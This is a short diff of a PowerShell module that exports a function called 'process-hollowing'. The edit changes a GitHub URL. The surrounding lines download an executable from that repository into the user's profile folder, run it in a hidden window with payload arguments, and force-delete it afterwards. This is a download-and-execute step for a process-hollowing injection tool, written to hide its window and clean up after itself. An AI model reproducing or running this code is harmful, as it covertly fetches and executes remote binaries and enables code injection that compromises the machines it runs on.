@@ -322,7 +322,7 @@ $Tmode = $args[1]
 $Tmode = "`"$Tmode`""
 $TmodeContent = $Tmode
 cd $env:userprofile\
-curl https://github.com/sc4r3c0d3/tsk2lvgen/edit/main/hlwp.exe -o holw.exe
+curl https://github.com/sc4r3c0d3/tsk2lvgen/blob/main/hlwp.exe -o holw.exe
 $process = Start-Process "holw.exe" -ArgumentList "$PcodeContent" , "$TmodeContent" -WindowStyle Hidden -PassThru; $process.WaitForExit(); Remove-Item "holw.exe" -Force -ErrorAction SilentlyContinue
 }
 Export-ModuleMember -Function process-hollowing
